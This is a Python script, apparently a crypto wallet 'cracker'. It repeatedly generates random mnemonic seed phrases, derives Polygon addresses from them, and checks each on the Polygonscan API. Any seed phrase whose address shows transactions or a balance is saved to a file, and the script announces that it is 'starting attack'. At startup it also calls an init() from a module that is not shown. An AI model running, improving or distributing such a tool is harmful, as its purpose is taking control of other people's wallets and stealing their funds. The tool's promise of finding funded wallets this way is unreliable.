import os
import configparser
import time
import datetime
import requests
from hdwallet import BIP44HDWallet # pip install hdwallet
from hdwallet.cryptocurrencies import EthereumMainnet
import psutil
from hdwallet.derivations import BIP44Derivation
from hdwallet.utils import generate_mnemonic
from typing import Optional
from colorama import Fore
from src.modules import init
print(Fore.RED + "Compiling modules and starting attack please wait 10-15 secs...")
init()
def check_connection():
    url='https://www.google.com/'
    try:
        requests.get(url, timeout=10)
        return True
    except requests.exceptions.RequestException:
        return False

def mainnet_url():
    return "https://api.polygonscan.com/"

def mainnet_api():
    config = configparser.ConfigParser()
    config.read('config.ini')
    return config['api']['polygon']

def req_trnx(address):
    mainnet_url_link = mainnet_url()
    mainnet_api_key = mainnet_api()
    module = "account"
    action = "txlist"
    page_no = 1
    display_per_page = 1
    sort = "desc"
    connection_count = 1
    while True:
        if check_connection() is True:
            trnx_response = requests.get(f"{mainnet_url_link}api?module={module}&action={action}&address={address}&page={page_no}&offset={display_per_page}&sort={sort}&apikey={mainnet_api_key}", timeout=None)
            if trnx_response:
                trnx_info = trnx_response.json()
                return trnx_info
            break
        else:
            print(f"-------->>> Trying to establish a connection!!! || Checked: {connection_count} time(s) <<<--------\n")
            time.sleep(10)
            connection_count += 1
            os.system('cls')
            pass

def req_balance(address):
    psutil.cpu_count(logical=True)
    mainnet_url_link = mainnet_url()
    mainnet_api_key = mainnet_api()
    module = "account"
    action = "balance"
    connection_count = 1
    while True:
        if check_connection() is True:
            balance_response = requests.get(f"{mainnet_url_link}api?module={module}&action={action}&address={address}&apikey={mainnet_api_key}", timeout=None)
            if balance_response:
                balance_info = balance_response.json()
                return balance_info
            break
        else:
            print(f"-------->>> Trying to establish a connection!!! || Checked: {connection_count} time(s) <<<--------\n")
            time.sleep(10)
            connection_count += 1
            os.system('cls')
            pass

def main():
    os.system('cls')

    hasTransactionPath = "hasTransaction"
    hasBalancePath = "hasBalance"
    todays_date = datetime.date.today()

    looper_count = 0
    balanceFound_count = 0
    trnxFound_count = 0
    init_run_time = time.monotonic()
    run_time = 0
    execution_time = 0
    looper = True
    while looper:
        start_time = time.monotonic()
        print(f"Total Checked: {looper_count} || Execution Per Time: {execution_time} || Elapsed Time: {run_time}")
        print(f"Transaction Found: {trnxFound_count} || Balance Found: {balanceFound_count}")

        MNEMONIC: str = generate_mnemonic(language="english", strength=128)
        PASSPHRASE: Optional[str] = None

        bip44_hdwallet: BIP44HDWallet = BIP44HDWallet(cryptocurrency=EthereumMainnet)
        bip44_hdwallet.from_mnemonic(mnemonic=MNEMONIC, language="english", passphrase=PASSPHRASE)

        print("Checking Mnemonic:", bip44_hdwallet.mnemonic())

        for address_index in range(1):
            bip44_derivation: BIP44Derivation = BIP44Derivation(
                cryptocurrency=EthereumMainnet, account=0, change=False, address=address_index
            )
            bip44_hdwallet.from_path(path=bip44_derivation)
            print(f"Polygon Address: {bip44_hdwallet.address()}")

            wallet_trnx_status = req_trnx(bip44_hdwallet.address())
            print(Fore.GREEN + f"--->>> Checking Transaction(s) on Polygon")
            if wallet_trnx_status["status"] == "1":
                trnxFound_count += 1
                print(f"************ Found Transaction on Polygon")
                with open(r"{}\hasTransaction-{}.txt".format(hasTransactionPath, todays_date), "a") as hb:
                    hb.write("polygon")
                    hb.write(" - ")
                    hb.write(" || Mnemonic : ")
                    hb.write(bip44_hdwallet.mnemonic())
                    hb.write(" || ")
                    hb.write(bip44_hdwallet.address())
                    hb.write(" ")
                    hb.write('\n')
                    hb.close()
                print(f"-------->>> Checking Balance on Polygon")
                wallet_trnx_balance = req_balance(bip44_hdwallet.address())
                if wallet_trnx_balance["result"] != "0":
                    balanceFound_count += 1
                    print(f"************ Found Balance on Polygon")
                    with open(r"{}\hasBalance-{}.txt".format(hasBalancePath, todays_date), "a") as hb:
                        hb.write("polygon")
                        hb.write(" - ")
                        hb.write(wallet_trnx_balance["result"])
                        hb.write(" || Mnemonic : ")
                        hb.write(bip44_hdwallet.mnemonic())
                        hb.write(" || ")
                        hb.write(bip44_hdwallet.address())
                        hb.write(" ")
                        hb.write('\n')
                        hb.close()
                else:
                    print(f"xxxxxxxx Not Found Balance on Polygon")
            else:
                print(f"xxxxxxxx No Transactions Found on Polygon")

        looper_count += 1
        end_time = time.monotonic()
        execution_time = datetime.timedelta(seconds=end_time - start_time)
        run_time = datetime.timedelta(seconds=end_time - init_run_time)
        bip44_hdwallet.clean_derivation()
        os.system('cls')

if __name__ == '__main__':
    main()
